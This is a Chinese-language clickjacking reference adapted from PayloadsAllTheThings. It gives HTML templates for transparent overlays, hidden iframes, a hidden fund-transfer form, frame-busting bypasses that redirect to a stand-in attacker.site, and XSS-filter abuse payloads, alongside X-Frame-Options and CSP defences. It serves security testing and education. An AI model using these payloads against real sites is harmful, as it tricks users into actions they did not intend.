# Clickjacking - 点击劫持

[SEARCH_KEYWORDS]
漏洞类型: Clickjacking 点击劫持 UI Redressing UI覆盖攻击
攻击类型: UI Redressing Frame Injection User Interface Attacks
关键词: iframe frame overlay transparent opacity click hijack
技术: Invisible Frames UI Redressing Button Hijacking Form Hijacking
防护: X-Frame-Options CSP frame-ancestors SAMEORIGIN DENY

[CONTENT]

## 点击劫持概述

点击劫持是一种Web安全漏洞，恶意网站欺骗用户点击不同于用户感知的内容，可能导致用户在不知情的情况下执行意外操作。

## 攻击技术

### UI Redressing (UI覆盖)

攻击者创建透明HTML元素覆盖合法网站：

```html
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
  <a href="malicious-link">Click me</a>
</div>
```

工作原理：
1. 覆盖透明元素
2. 定位和分层
3. 误导用户交互
4. 用户点击触发隐藏元素

### Invisible Frames (不可见框架)

使用隐藏iframe欺骗用户：

```html
<iframe src="malicious-site" style="opacity: 0; height: 0; width: 0; border: none;"></iframe>
```

工作原理：
1. 创建隐藏iframe
2. 加载恶意内容
3. 用户与隐藏内容交互
4. 执行意外操作

### Button/Form Hijacking (按钮/表单劫持)

```html
<button onclick="submitForm()">Click me</button>
<form action="legitimate-site" method="POST" id="hidden-form">
  <!-- Hidden form fields -->
</form>
<script>
  function submitForm() {
    document.getElementById('hidden-form').submit();
  }
</script>
```

### 隐藏表单执行

```html
<form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="action" value="transfer-funds">
</form>
```

## 防护措施

### X-Frame-Options头

```apache
Header always append X-Frame-Options SAMEORIGIN
```

值：
- `DENY` - 完全禁止嵌入
- `SAMEORIGIN` - 仅同源可嵌入

### Content Security Policy (CSP)

```html
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">
```

### 禁用JavaScript绕过

IE restricted属性：

```html
<iframe src="http://target site" security="restricted"></iframe>
```

HTML5 sandbox属性：

```html
<iframe src="http://target site" sandbox></iframe>
```

## Frame Busting绕过

### OnBeforeUnload事件

```html
<script>
    window.onbeforeunload = function() {
        return " Do you want to leave fictitious.site?";
    }
</script>
<iframe src="http://target site">
```

### 自动取消导航

```js
<script>
    var prevent_bust = 0;
    window.onbeforeunload = function() {
        prevent_bust++;
    };
    setInterval(function() {
        if (prevent_bust > 0) {
            prevent_bust -= 2;
            window.top.location = "http://attacker.site/204.php";
        }
    }, 1);
</script>
```

## XSS过滤器利用

### IE8 XSS过滤器

```html
<iframe src="http://target site/?param=<script>if">
```

### Chrome XSSAuditor

```html
<iframe src="http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D">
```

## 工具

- Burp Suite
- OWASP ZAP
- clickjack - 点击劫持测试工具

## 参考文档

原始来源: PayloadsAllTheThings/Clickjacking/README.md